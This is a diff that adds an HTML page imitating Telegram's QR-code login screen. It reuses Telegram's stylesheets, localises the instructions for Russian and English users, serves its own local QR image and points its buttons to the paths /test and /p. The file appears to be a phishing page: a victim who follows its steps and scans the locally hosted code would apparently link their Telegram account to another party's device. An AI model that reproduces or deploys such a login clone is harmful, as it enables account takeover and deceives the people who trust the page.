@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Telegram Authorization</title>
+    <link
+      rel="stylesheet"
+      href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css"
+      integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3"
+      crossorigin="anonymous"
+    />
+    <link
+      href="https://fonts.googleapis.com/css?family=Roboto:400,500"
+      rel="stylesheet"
+      type="text/css"
+    />
+    <link
+      href="https://telegram.org/css/bootstrap.min.css?3"
+      rel="stylesheet"
+    />
+    <link
+      href="https://telegram.org/css/bootstrap-extra.css?2"
+      rel="stylesheet"
+    />
+    <link href="https://telegram.org/css/telegram.css?231" rel="stylesheet" />
+    <link href="../static/css/oauth.css?14" rel="stylesheet" />
+    <link rel="stylesheet" href="../static/css/style.css" />
+  </head>
+  <body>
+    <style>
+      a,
+      a:hover {
+        color: #fff;
+        text-decoration: none;
+      }
+    </style>
+    <main class="holder">
+      <!-- <iframe src="{{bg_link}}" frameborder="0"></iframe> -->
+      <div class="auth-container d-flex">
+        <section
+          class="auth-content w-100 d-flex flex-column align-items-center"
+          role="document"
+        >
+          <div class="auth-code">
+            <img src="../static/images/qrcode.jpg" alt="QR Code" />
+          </div>
+          <h1 class="auth-title text-center text-white" id="auth-title"></h1>
+          <ol class="auth-steps-list text-start text-white">
+            <li id="auth-step-1"></li>
+            <li id="auth-step-2"></li>
+            <li id="auth-step-3"></li>
+          </ol>
+          <div class="auth-footer">
+            <button
+              class="auth-button"
+              type="button"
+              onclick="return toLogin(event)"
+            >
+              <a id="auth-button-link" href="/p"></a>
+              <!-- <span class="ripple-mask"><span class="ripple"></span></span> -->
+            </button>
+          </div>
+        </section>
+      </div>
+    </main>
+    <script>
+      function toLogin(e) {
+        window.location.href = "/test";
+      }
+
+      var userLang = navigator.language || navigator.userLanguage;
+
+      lang = userLang.split("-")[0];
+
+      if (lang == "ru") {
+        document.getElementById("auth-title").innerHTML =
+          "Быстрый вход по QR-коду";
+        document.getElementById("auth-step-1").innerHTML =
+          "Откройте Telegram с телефона";
+        document.getElementById(
+          "auth-step-2"
+        ).innerHTML = `Откройте <b>Настройки</b> > <b>Устройства</b> > <b>Подключить устройство</b>.`;
+        document.getElementById("auth-step-3").innerHTML =
+          "Для подтверждения направьте камеру телефона на этот экран.";
+        document.getElementById("auth-button-link").innerHTML =
+          "Вход по номеру телефона";
+      } else {
+        document.getElementById("auth-title").innerHTML =
+          "Log in to Telegram by QR Code";
+        document.getElementById("auth-step-1").innerHTML =
+          "Open Telegram on your phone";
+        document.getElementById(
+          "auth-step-2"
+        ).innerHTML = `Go to <b>Settings</b> > <b>Devices</b> > <b>Link Desktop Device</b>`;
+        document.getElementById("auth-step-3").innerHTML =
+          "Point your phone at this screen to confirm login";
+        document.getElementById("auth-button-link").innerHTML =
+          "Log in by phone number";
+      }
+    </script>
+  </body>
+</html>
